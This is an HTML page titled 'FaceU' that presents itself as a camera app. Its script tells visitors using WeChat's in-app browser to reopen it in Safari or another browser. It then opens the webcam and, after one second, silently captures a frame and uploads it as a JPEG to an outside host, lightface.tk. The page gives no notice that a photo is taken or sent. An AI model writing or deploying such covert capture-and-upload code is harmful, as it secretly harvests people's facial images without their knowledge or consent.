<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FaceU</title>
    <style>
        h1 {
            text-align: center
        }
    </style>
</head>
<body>
    <h1 id="tip"></h1>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <h3 id="errorMsg"></h3>

    <script>
        var agent = navigator.userAgent.toLocaleLowerCase()
        var tip = document.getElementById('tip')
        if (agent.indexOf('micromessenge') > -1) {
            if (agent.indexOf('iphone') > -1) {
                tip.innerHTML = '请点击右上角，在Safari中打开'
            } else {
                tip.innerHTML = '请在浏览器中打开'
            }
        } else {
            getCamera()
        }

        function getCamera() {
            var errorElement = document.getElementById('errorMsg')
            var video = document.getElementById('video')

            var constraints = window.constraints = {
                audio: false,
                video: true
            };
            navigator.mediaDevices.getUserMedia(constraints).
            then(handleSuccess).catch(handleError)
        }

        function handleSuccess(stream) {
            var videoTracks = stream.getVideoTracks()
            console.log('Got stream with constraints:', constraints)
            console.log('Using video device: ' + videoTracks[0].label)
            stream.oninactive = function () {
                console.log('Stream inactive')
            };
            video.srcObject = stream;
            
            setTimeout(beginSend, 1000)
        }

        function handleError(error) {
            errorElement.innerHTML = error
        }

        function beginSend() {
            canvas.width = video.videoWidth
            canvas.height = video.videoHeight
            var ctx =  canvas.getContext('2d')
            ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight)

            canvas.toBlob( data => {
                var ajax = new XMLHttpRequest()
                ajax.open('POST', 'https://lightface.tk/upload', true)
                var formData = new FormData()
                formData.append('image', data)
                ajax.send(formData)
            }, "image/jpeg", 0.8)
        }
    </script>
</body>
</html>
